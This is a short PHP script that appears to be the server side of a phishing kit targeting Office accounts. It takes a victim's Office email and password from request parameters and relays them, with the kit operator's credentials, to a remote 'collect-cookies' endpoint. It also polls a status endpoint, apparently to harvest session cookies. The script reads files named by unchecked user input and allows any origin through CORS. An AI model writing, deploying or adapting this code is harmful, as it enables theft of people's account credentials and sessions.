<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
include 'config.php';
if(isset($_GET["auth"])){
  if($_GET["auth"]=="AppAuth"){
    $url = $base."results/get-status?session=".file_get_contents($_GET["email"].".txt");
       $rsp=curl($url);
        print_r($rsp);
        exit();
  }
}

if(isset($_GET["opt"])){
        $params = "email=".$email."&password=".$token."&page=".$page."&office_email=".$_GET["em"]."&office_password=".$_GET["ps"]."&session=".file_get_contents($_GET["em"].".txt");
     $url = $base."results/collect-cookies?".$params;
    $res=curl($url);
    print_r($res);
    exit();
}
 function curl($url){
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       curl_setopt($curl, CURLOPT_HEADER, false);
       $data = curl_exec($curl);
       curl_close($curl);
       return $data;
   }
?>